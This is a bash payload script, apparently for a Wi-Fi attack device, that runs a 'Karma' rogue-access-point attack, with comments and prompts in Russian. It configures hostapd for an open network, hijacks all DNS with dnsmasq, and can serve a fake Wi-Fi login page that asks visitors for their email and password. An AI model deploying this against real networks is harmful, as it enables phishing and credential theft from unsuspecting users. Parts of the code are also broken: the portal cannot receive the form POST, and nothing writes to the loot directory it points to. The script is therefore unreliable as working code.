#!/bin/bash
. /root/payloads/library/nullsec-ui.sh
# Title: NullSec Karma Attack
# Author: bad-antics
# Description: Мошенническая AP, отвечающая на все probe-запросы
# Category: nullsec

# Автоматически определяет правильный беспроводной интерфейс (экспортирует $IFACE).
# При отсутствии интерфейса показывает диалог ошибки.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

LOOT_DIR="/mmc/nullsec"
mkdir -p "$LOOT_DIR"/{karma,creds,logs}

PROMPT "NULLSEC KARMA ATTАКА

Мошенническая точка доступа, отвечающая
на probe-запросы клиентов.

Похищает учетные данные через
фальшивый портал.

Нажмите ОК для настройки."

# Требуется интерфейс для AP
if [ ! -d "/sys/class/net/$IFACE" ]; then
    ERROR_DIALOG "$IFACE не найден!
    
Требуется $IFACE для режима AP."
    exit 1
fi

# SSID для открытой AP
SSID=$(TEXT_PICKER "Имя SSID AP:" "FreeWiFi")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SSID="FreeWiFi" ;; esac

# Канал
CHANNEL=$(NUMBER_PICKER "Канал WiFi (1-11):" 6)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) CHANNEL=6 ;; esac
[ $CHANNEL -lt 1 ] && CHANNEL=1
[ $CHANNEL -gt 11 ] && CHANNEL=11

# Длительность
DURATION=$(NUMBER_PICKER "Длительность (секунд):" 300)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=300 ;; esac
[ $DURATION -lt 60 ] && DURATION=60

# Фальшивый портал?
PORTAL=""
resp=$(CONFIRMATION_DIALOG "Включить фальшивый портал?

Перенаправляет клиентов на поддельную
страницу входа для захвата данных.")
[ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ] && PORTAL="1"

resp=$(CONFIRMATION_DIALOG "Запустить атаку Karma?

SSID: $SSID
Канал: $CHANNEL
Длительность: ${DURATION}s
Портал: $([ -n "$PORTAL" ] && echo YES || echo NO)

ВНИМАНИЕ: Будет создана фальшивая точка доступа!")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

# Остановить конфликтующие службы
killall hostapd dnsmasq 2>/dev/null

# Настройка AP
LOG "Запуск фейкового AP..."

cat > /tmp/karma_hostapd.conf << EOF
interface=$IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
wpa=0
EOF

# Запуск hostapd
hostapd /tmp/karma_hostapd.conf &
HOSTAPD_PID=$!
sleep 2

# Настройка IP
ifconfig $IFACE 10.0.0.1 netmask 255.255.255.0 up

# Запуск DHCP
cat > /tmp/karma_dnsmasq.conf << EOF
interface=$IFACE
dhcp-range=10.0.0.10,10.0.0.100,12h
address=/#/10.0.0.1
EOF

dnsmasq -C /tmp/karma_dnsmasq.conf &
DNSMASQ_PID=$!

# Простой логгер учетных данных
if [ -n "$PORTAL" ]; then
    # Создать простую портал-страницу
    mkdir -p /tmp/portal
    cat > /tmp/portal/index.html << 'HTML'
<!DOCTYPE html>
<html>
<head><title>Требуется вход WiFi</title></head>
<body style="font-family:Arial;text-align:center;padding:50px;">
<h1>Требуется вход в WiFi</h1>
<form method="POST" action="/login">
<input name="email" placeholder="Email" style="padding:10px;margin:5px;"><br>
<input name="password" type="password" placeholder="Пароль" style="padding:10px;margin:5px;"><br>
<button style="padding:10px 30px;">Войти</button>
</form>
</body></html>
HTML
    
    # Запуск простого HTTP-сервера (если доступен python)
    if command -v python3 >/dev/null 2>&1; then
        cd /tmp/portal && python3 -m http.server 80 &
        HTTP_PID=$!
    fi
fi

LOG "Фейковый AP активен: $SSID"

# Мониторинг в течение времени
sleep $DURATION

# Очистка
kill $HOSTAPD_PID $DNSMASQ_PID $HTTP_PID 2>/dev/null
killall hostapd dnsmasq 2>/dev/null

# Подсчет подключений
CLIENTS=$(cat /tmp/dnsmasq.leases 2>/dev/null | wc -l || echo 0)

PROMPT "АТАКА KARMA ЗАВЕРШЕНА

SSID: $SSID
Подключено клиентов: $CLIENTS

Проверьте логи в:
$LOOT_DIR/karma/

Нажмите ОК для выхода."
